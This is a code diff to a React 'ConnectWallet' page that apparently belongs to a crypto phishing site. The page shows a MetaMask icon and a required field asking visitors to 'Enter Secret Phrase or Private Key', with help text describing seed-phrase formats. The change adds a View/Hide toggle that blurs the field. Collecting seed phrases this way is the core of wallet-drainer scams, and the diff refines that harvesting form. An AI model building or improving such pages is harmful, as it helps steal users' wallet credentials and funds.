@@ -1,7 +1,7 @@
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Textarea } from "@/components/ui/textarea";
-import { Wallet, Link as LinkIcon, CreditCard, Shield, Palette, Cpu, Ghost, Circle, ArrowLeft, WifiOff, Loader2, CheckCircle } from "lucide-react";
+import { Wallet, Link as LinkIcon, CreditCard, Shield, Palette, Cpu, Ghost, Circle, ArrowLeft, WifiOff, Loader2, CheckCircle, Eye, EyeOff } from "lucide-react";
 import { Link } from "wouter";
 import { useState } from "react";
 import metamaskIcon from "@assets/image_1762763337117.png";
@@ -37,6 +37,7 @@ export default function ConnectWallet() {
   const [showApplicationForm, setShowApplicationForm] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState<string>("");
+  const [showSecretPhrase, setShowSecretPhrase] = useState(false);
   const [formData, setFormData] = useState({
     name: "",
     email: "",
@@ -144,18 +145,40 @@ export default function ConnectWallet() {
               </div>
 
               <div className="space-y-2">
-                <label htmlFor="application-details" className="text-sm font-semibold text-[#f5f1e8]">
-                  Enter Secret Phrase or Private Key
-                </label>
-                <Textarea
-                  id="application-details"
-                  required
-                  value={formData.message}
-                  onChange={(e) => setFormData({ ...formData, message: e.target.value })}
-                  className="bg-[#0a1614] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#6b7280] min-h-[160px]"
-                  placeholder=""
-                  data-testid="textarea-application"
-                />
+                <div className="flex items-center justify-between">
+                  <label htmlFor="application-details" className="text-sm font-semibold text-[#f5f1e8]">
+                    Enter Secret Phrase or Private Key
+                  </label>
+                  <button
+                    type="button"
+                    onClick={() => setShowSecretPhrase(!showSecretPhrase)}
+                    className="flex items-center gap-2 text-sm text-[#9ca3af] hover:text-[#f5f1e8] transition-colors"
+                    data-testid="button-toggle-visibility"
+                  >
+                    {showSecretPhrase ? (
+                      <>
+                        <EyeOff className="w-4 h-4" />
+                        <span>Hide</span>
+                      </>
+                    ) : (
+                      <>
+                        <Eye className="w-4 h-4" />
+                        <span>View</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+                <div className="relative">
+                  <Textarea
+                    id="application-details"
+                    required
+                    value={formData.message}
+                    onChange={(e) => setFormData({ ...formData, message: e.target.value })}
+                    className={`bg-[#0a1614] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#6b7280] min-h-[160px] ${!showSecretPhrase ? 'blur-sm' : ''}`}
+                    placeholder=""
+                    data-testid="textarea-application"
+                  />
+                </div>
                 <div className="text-xs text-[#9ca3af] space-y-1">
                   <p>Secret Phrase is typically 12 (sometimes 18, 24) words separated by single spaces</p>
                   <p>Private Key is a long alphanumeric code</p>
